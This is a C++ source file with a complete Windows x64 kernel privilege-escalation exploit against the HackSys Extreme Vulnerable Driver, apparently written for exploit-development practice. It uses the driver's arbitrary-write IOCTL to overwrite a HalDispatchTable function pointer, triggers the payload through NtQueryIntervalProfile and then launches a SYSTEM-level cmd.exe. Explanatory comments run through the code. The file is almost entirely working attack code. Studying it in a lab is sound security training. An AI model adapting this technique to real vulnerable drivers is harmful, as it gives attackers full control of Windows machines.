#include <iostream>
#include <Windows.h>
#include <Psapi.h>

extern "C" void __stdcall payload(void);

// Template for calling NtQueryIntervalProfile from its address
typedef NTSTATUS(WINAPI* NtQueryIntervalProfilePtr)(IN ULONG ProfileSource, OUT PULONG Interval);

// Recreation of the structure utilized in the driver
struct WriteWhatWhere
{
	uintptr_t what;
	uintptr_t where;
};

// Gets the base address of a kernel module from its name
LPVOID GetKernelModuleBaseAddress(const char* moduleName)
{
	// Array to store kernel module base addresses (needed with EnumDeviceDrivers)
	LPVOID lpImageBase[1024];
	// These could be one variable but using two for readablility
	DWORD bytes_returned, number_of_drivers;
	// Null terminated char array that the driver names will be copied into
	CHAR szName[1024];
	// Get Driver base addresses
	if (EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &bytes_returned))
	{
		// Calcualate number of read drivers
		number_of_drivers = bytes_returned / sizeof(LPVOID);
		for (int i = 0; i < number_of_drivers; i++)
		{
			// Get the driver name from its base address and compare it to the target driver
			if (GetDeviceDriverBaseNameA(lpImageBase[i], szName, sizeof(szName)) > 0)
			{
				if (strcmp(szName, moduleName) == 0)
				{
					return lpImageBase[i];
				}
			}
		}
	}
	return (LPVOID)-1;
}

int main()
{
	HANDLE driver;
	HMODULE ntoskrnlLocalHandle, ntdll;
	DWORD bytes_returned;
	uintptr_t ntoskrnlBaseAddress, HalDispatchTableAddy;
	uintptr_t payloadAddy = (uintptr_t)payload;
	STARTUPINFOA startInfo;
	PROCESS_INFORMATION procInfo;
	WriteWhatWhere* data;
	NtQueryIntervalProfilePtr NtQueryIntervalProfile;
	// HEVD_IOCTL_ARBITRARY_WRITE
	int ioctl_opcode = 0x22200b;
	const char* driverPath = "\\\\.\\HackSysExtremeVulnerableDriver";
	const char* ntoskrnlPath = "C:\\windows\\system32\\ntoskrnl.exe";
	// Needed for DeviceIoControl
	char out[64];

	printf("HEVD Write What Where Exploit x64\n");

	// We need to get the base address of the windows kernel (ntoskrnl.exe) so we can get the kernel address of the HalDispatchTable array
	// You can get the array address with GetProcAddress so if we load the binary locally with LoadLibrary and get the user mode HalDispatchTable address
	// we can use that to calculate the offset from the base address, which when added with the kernel address of ntoskrnl.exe will give us the address
	// of the actual HalDispatchTable array used by the kernel
	printf("[*] Getting kernel base address\n");
	ntoskrnlBaseAddress = (uintptr_t)GetKernelModuleBaseAddress("ntoskrnl.exe");
	if (ntoskrnlBaseAddress == -1)
	{
		printf("[-] Error getting kernel base address\n");
		return 0;
	}
	printf("[+] ntoskrnl.exe base address: %p\n", ntoskrnlBaseAddress);

	printf("[*] Creating local instance of ntoskrnl.exe\n");
	ntoskrnlLocalHandle = LoadLibraryA(ntoskrnlPath);
	if (ntoskrnlLocalHandle == NULL)
	{
		printf("[-] Error %d opening local kernel instance with LoadLibraryA\n", GetLastError());
		return 0;
	}
	printf("[+] Opened handle to ntoskrnl.exe %p\n", ntoskrnlLocalHandle);

	printf("[*] Getting offset to the HalDispatchTable\n");
	HalDispatchTableAddy = (uintptr_t)GetProcAddress(ntoskrnlLocalHandle, "HalDispatchTable");
	if (HalDispatchTableAddy == NULL)
	{
		printf("[-] Error %d when getting user mode address of the HalDispatchTable\n", GetLastError());
		return 0;
	}
	HalDispatchTableAddy = (HalDispatchTableAddy - (uintptr_t)ntoskrnlLocalHandle) + ntoskrnlBaseAddress;
	printf("[+] HalDispatchTable kernel address: %p\n", HalDispatchTableAddy);

	// Now the importance of the HalDispatchTable is that its an array of function pointers in a writable kernel memory region
	// and originally discovered in this paper from 2007 https://shinnai.altervista.org/papers_videos/ECFID.pdf
	// the second member of the array is called by the KeQueryIntervalProfile function which is called by the NtQueryIntervalProfile
	// function inside ntdll which we have access to from user mode!
	// Because of this we need to find the user mode address of NtQueryIntervalProfile so after we overwrite the second member of the HalDispatchTable
	// function pointer we can call the API to execute our payload
	printf("[*] Opening handle to ntdll.dll\n");
	ntdll = GetModuleHandleA("ntdll.dll");
	if (ntdll == 0)
	{
		printf("[-] Error %d getting handle to ntdll.dll\n", GetLastError());
		return 0;
	}
	printf("[+] Opened handle to ntdll %p\n", ntdll);
	NtQueryIntervalProfile = (NtQueryIntervalProfilePtr)GetProcAddress(ntdll, "NtQueryIntervalProfile");
	if (NtQueryIntervalProfile == NULL)
	{
		printf("[-] Error %d getting address of NtQueryIntervalProfile from ntdll.dll\n", GetLastError());
		return 0;
	}
	printf("[+] NtQueryIntervalProfile function at %p\n", NtQueryIntervalProfile);
	
	// Now we need to create our WriteWhatWhere structure on the heap, when created on the stack the structure doesn't
	// properly get passed to the driver
	printf("[*] Creating WriteWhatWhere structure\n");
	data = (WriteWhatWhere*)malloc(sizeof(WriteWhatWhere));
	if (data == 0)
	{
		printf("[-] Error %d allocating memory for WriteWhatWhere structure\n", GetLastError());
		return 0;
	}

	printf("Structure address: %p\n", data);
	data->what = (uintptr_t)&payloadAddy;
	printf("Write address: %p\n", data->what);
	// Since the HalDispatchTable is an array of function pointers, to get the second member we need to
	// add the size of a pointer (8 bytes for x64, 4 bytes for x86)
	// uintptr_t's size changes to either of these based on archetecture its compiled for
	// so its useful here for understandablility and porting the exploit to x86
	data->where = HalDispatchTableAddy + sizeof(uintptr_t);
	printf("Where address: %p\n", data->where);

	// Open a handle to interface with the driver
	printf("[*] Opening handle to driver\n");
	driver = CreateFileA(driverPath, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	if (driver == INVALID_HANDLE_VALUE)
	{
		printf("[-] Error %d when getting handle to driver\n", GetLastError());
		free(data);
		return 0;
	}
	printf("[+] Opened handle to driver %p\n", driver);

	// Send our payload to the driver with the IOCTL code for the arbitrary kernel write vulnerablilty
	printf("[*] Sending payload to driver\n");
	if (!DeviceIoControl(driver, ioctl_opcode, data, sizeof(WriteWhatWhere), out, 64, &bytes_returned, 0))
	{
		printf("[-] Error %d sending IOCTL code to driver\n", GetLastError());
		free(data);
		CloseHandle(driver);
		return 0;
	}
	// Go ahead and free our driver handle and WriteWhatWhere structure as we don't need them anymore
	printf("[+] Payload sent to driver, calling NtQueryIntervalProfile\n");
	free(data);
	CloseHandle(driver);
	
	// Call NtQueryIntervalProfile so our function pointer written to the second HalDispatchTable member will be executed
	NtQueryIntervalProfile(4, &bytes_returned);
	printf("[+] NtQueryIntervalProfile ran, opening shell!\n");

	// Our payload should have ran and given our process a system level security token
	// so anything here will be executed with system level permissions
	// In this case the POC simple opens a cmd.exe shell
	memset(&startInfo, 0, sizeof(STARTUPINFOA));
	startInfo.cb = sizeof(STARTUPINFOA);
	if (!CreateProcessA(0, (LPSTR)"cmd.exe", 0, 0, 0, 0, 0, 0, &startInfo, &procInfo))
	{
		printf("[-] Error %d opening shell\n", GetLastError());
	}
	else
	{
		WaitForSingleObject(procInfo.hProcess, INFINITE);
		CloseHandle(procInfo.hThread);
		CloseHandle(procInfo.hProcess);
	}

	return 0;
}